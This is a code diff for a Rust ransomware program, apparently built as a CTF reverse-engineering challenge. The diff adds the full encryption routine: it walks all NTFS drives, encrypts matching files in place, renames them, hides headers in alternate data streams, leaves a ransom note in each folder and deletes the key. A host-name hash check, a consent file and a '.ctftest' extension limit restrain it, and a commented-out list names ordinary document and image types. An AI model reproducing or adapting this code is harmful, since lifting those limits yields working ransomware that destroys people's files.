@@ -3,20 +3,38 @@
 mod cipher;
 mod key_mgmt;
 
-use anyhow::{bail, Result, anyhow};
+use anyhow::{anyhow, bail, Result};
+use cipher::PerVictimKey;
 use single_instance::SingleInstance;
+use skip_error::{skip_error_and_debug, SkipError};
+use std::fs::File;
+use std::fs;
+use std::io::Write;
+use std::path::{Path, PathBuf};
+use std::sync::mpsc;
+use std::thread;
 use sys_locale::get_locale;
+use walkdir::WalkDir;
 use widestring::U16CString;
+use windows::w;
 use windows::Win32::Storage::FileSystem::{GetLogicalDrives, GetVolumeInformationW};
 use windows::Win32::System::SystemServices::{FILE_NAMED_STREAMS, FILE_READ_ONLY_VOLUME};
-use windows::w;
 use windows::{Win32::System::WindowsProgramming::*, Win32::UI::WindowsAndMessaging::*};
 
 // blake3::hash(b"the-victim-host-8deb7b96")
 const EXPECTED_COMPUTER_NAME_HASH_HEX: &'static str =
     "7e199a3cd61f888b67bbc6eb5ea707bca51b6d5af06b39c2fb038426f1a17fe5";
-const CONSENT_MARKER_FILE_NAME: &'static str = 
+const CONSENT_MARKER_FILE_NAME: &'static str =
     "YesIKnowIAmRunningARealRansomwareTheDecryptionKeyWillOnlyBeReleasedAfterTheCTFEndsPleaseGoOn.txt";
+const RANSOM_LETTER_FILE_NAME: &'static str = "!!!READMEToRecoverYourFiles!!!.txt";
+// const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &[
+//     "txt", "doc", "docx", "jpg", "png", "bmp", "7z", "zip", "rar", "sav", "py", "js", "ppt",
+//     "pptx", "xls", "xlsx",
+// ];
+const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &[
+    "ctftest",
+];
+const QUEUE_SIZE: usize = 1024;
 
 fn get_computer_name() -> Result<String> {
     let mut size = 0;
@@ -36,9 +54,11 @@ fn check_precondition() -> Result<()> {
     if computer_name_hash != expected_hash {
         bail!("computer name mismatches");
     }
-    
+
     let user_dirs = directories::UserDirs::new().unwrap();
-    let desktop = user_dirs.desktop_dir().ok_or(anyhow!("failed to find desktop"))?;
+    let desktop = user_dirs
+        .desktop_dir()
+        .ok_or(anyhow!("failed to find desktop"))?;
     if !desktop.join(CONSENT_MARKER_FILE_NAME).exists() {
         bail!("no consent marker found");
     }
@@ -71,7 +91,7 @@ fn get_all_suitable_drives() -> Vec<String> {
     let mut result: Vec<String> = Vec::new();
     for i in 0..26 {
         if (drive_mask & (1 << i)) == 0 {
-            continue
+            continue;
         }
         let drive = format!("{}:\\", (b'A' + i as u8) as char);
         // Call GetVolumeInformation to check the filesystem type
@@ -80,25 +100,130 @@ fn get_all_suitable_drives() -> Vec<String> {
         let drive_ptr = windows::core::PCWSTR::from_raw(drive_u16.as_ptr());
         let mut flags: u32 = 0;
         unsafe {
-            if !GetVolumeInformationW(drive_ptr, None, None, None, Some(&mut flags), Some(&mut fs_type)).as_bool() {
-                continue
+            if !GetVolumeInformationW(
+                drive_ptr,
+                None,
+                None,
+                None,
+                Some(&mut flags),
+                Some(&mut fs_type),
+            )
+            .as_bool()
+            {
+                continue;
             }
         }
         if fs_type[..5] != [b'N' as u16, b'T' as u16, b'F' as u16, b'S' as u16, 0] {
-            continue
+            continue;
         }
         if (flags & FILE_READ_ONLY_VOLUME != 0) || (flags & FILE_NAMED_STREAMS == 0) {
-            continue
+            continue;
         }
         result.push(drive)
     }
     result
 }
 
-fn main() {
-    assert_precondition();
-    let holder = SingleInstance::new("happyropeware-dc52184435e51deee395").unwrap();
-    if !holder.is_single() {
-        return
+fn is_victim_file(entry: &walkdir::DirEntry) -> bool {
+    if let Some(ext) = entry.path().extension() {
+        return entry.file_type().is_file()
+            && entry.file_name() != RANSOM_LETTER_FILE_NAME
+            && EXTENSION_TO_ENCRYPT.iter().any(|v| v == &ext);
     }
+    return false;
+}
+
+fn encrypt_file(path: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
+    let mut new_name = path.as_ref().file_name().unwrap().to_owned();
+    new_name.push(".UCryNow");
+    let new_path = path.as_ref().with_file_name(&new_name);
+    new_name.push(":HRW");
+    let ads_path = path.as_ref().with_file_name(new_name);
+
+    // TODO: This overwrites the file in-place, but it's not atomic, nor error-safe. At least make
+    // it error-safe.
+    fs::rename(&path, &new_path)?;
+    let mut fin = File::open(&new_path)?;
+    let mut fout = File::options().read(true).write(true).open(&new_path)?;
+    let header = cipher::encrypt_stream(&key, &mut fin, &mut fout)?;
+    File::create(ads_path)?.write_all(&header.to_vec())?;
+    fout.flush().ok();
+    fout.sync_data().ok();
+    Ok(())
+}
+
+fn drop_ransom_letter(dir: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
+    File::create(dir.as_ref().join(RANSOM_LETTER_FILE_NAME))?.write_all(format!(r#"Good morning!
+All your files are belong to us. Don't worry, they are encrypted by extremely safe modern cryptography.
+We can help you recover your files, but only after you pay us 1,000,000,007 meme gifs, and only after CTF ends.
+Complain hard in the DingTalk group (or Discord channel) if you want to get trolled, or REVERSE HARDER if you want to get your files back.
+
+早上好！一眼*真，鉴定为密！别担心，您的文件都被非常安全的现代密码学算法加密惹。
+我们可以帮助您恢复您的文件，但是只有在您支付给我们 1000000007 个表情包后，并且您得等到 CTF 结束。
+如果您想要被嘲笑，请用力在钉钉群（或 Discord 频道）里吐槽，如果您想要恢复您的文件，请 用 力 逆 向！
+
+Send memes along with the victim identifier to lolnoway@pm.me.
+
+Your victim identifier is: {}
+
+"#, &key.seal_for_operator()).as_bytes())?;
+    Ok(())
+}
+
+fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
+    let drives = get_all_suitable_drives();
+    let (letter_tx, letter_rx) = mpsc::channel::<PathBuf>();
+    let (tx, rx) = crossbeam_channel::bounded(QUEUE_SIZE);
+    let mut workers = Vec::new();
+    for _ in 0..thread::available_parallelism()?.get() {
+        let key = key.clone();
+        let rx = rx.clone();
+        let letter_tx = letter_tx.clone();
+        let jh = thread::spawn(move || {
+            rx.iter()
+                .map(|f| encrypt_file(&f, &key).and_then(|_| letter_tx.send(f).or(Ok(()))))
+                .skip_error_and_debug();
+        });
+        workers.push(jh);
+    }
+    let letterguy = {
+        let key = key.clone();
+        thread::spawn(move || {
+            for f in letter_rx {
+                if let Some(dir) = f.parent() {
+                    if !dir.join(RANSOM_LETTER_FILE_NAME).exists() {
+                        skip_error_and_debug!(drop_ransom_letter(&dir, &key));
+                    }
+                }
+            }
+        })
+    };
+    for drive in drives {
+        let walker = WalkDir::new(drive).same_file_system(true).into_iter();
+        for entry in walker
+            .skip_error()
+            .filter(|e| !e.path_is_symlink() && is_victim_file(&e))
+        {
+            skip_error_and_debug!(tx.send(entry.into_path()));
+        }
+    }
+    drop(tx);
+    for jh in workers {
+        jh.join().unwrap();
+    }
+    letterguy.join().unwrap();
+    Ok(())
+}
+
+fn main() -> Result<()> {
+    assert_precondition();
+    let holder = SingleInstance::new("happyropeware-dc52184435e51deee395")?;
+    if !holder.is_single() {
+        return Ok(());
+    }
+
+    let victim_key = key_mgmt::ensure_key()?;
+    the_boring_loop(&victim_key)?;
+    key_mgmt::destroy_key()?;
+    Ok(())
 }
